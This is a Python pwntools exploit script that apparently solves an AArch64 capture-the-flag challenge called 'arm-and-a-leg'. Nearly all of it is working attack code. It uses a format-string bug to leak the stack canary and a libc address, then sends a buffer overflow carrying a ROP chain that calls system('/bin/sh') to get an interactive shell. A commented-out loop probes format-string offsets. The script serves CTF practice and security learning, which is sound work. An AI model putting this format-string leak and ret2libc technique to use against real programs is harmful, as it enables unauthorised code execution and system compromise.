#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chal", checksec=False)
libc = ELF("./lib/libc.so.6")


def start(argv=[], *a, **kw):
    nc = "nc arm-and-a-leg.gold.b01le.rs 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    if args.GDB:
        return process([qemu, "-L", lpath,
                       "-g", str(debug_port), elf.path])
    else:
        return process([qemu, "-L", lpath,
                       elf.path] + argv, env=env, *a, **kw)


env = {}
qemu = "qemu-aarch64"
lpath = "."
debug_port = 1234

# for i in range(1, 128):
#     with context.quiet:
#         io = start()

#     io.sendlineafter(b"Legs\n", b"1")
#     io.sendlineafter(b"of?\n", b"1337")

#     payload = f"%{i}$p".encode()
#     io.sendlineafter(b"appendage? ", payload)
#     io.recvuntil(b"to: ")
#     leak = io.recvline()
#     log.info(f"{i}: {leak}")

#     with context.quiet:
#         io.close()

canary_idx = 15
libc_leak_idx = 17

io = start()
io.sendlineafter(b"Legs\n", b"1")
io.sendlineafter(b"of?\n", b"1337")
payload = f"%{canary_idx}$p|%{libc_leak_idx}$p".encode()
io.sendlineafter(b"appendage? ", payload)
io.recvuntil(b"to: ")
canary, libc_leak = map(lambda x: int(x, 16), io.recvline().split(b"|"))
libc.address = libc_leak - 0x273fc
log.info(f"{canary=:#x}")
log.info(f"{libc.address=:#x}")

# ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
gadget = libc.address + 0x69500

payload = flat(
    cyclic(0x68),
    canary,
    elf.bss(0xc00),
    gadget,
    0,
    canary,
    0,
    libc.sym["system"],
    0,
    libc.search(b"/bin/sh\x00").__next__(),
)
io.sendlineafter(b"feedback?!\n", payload)

io.interactive()
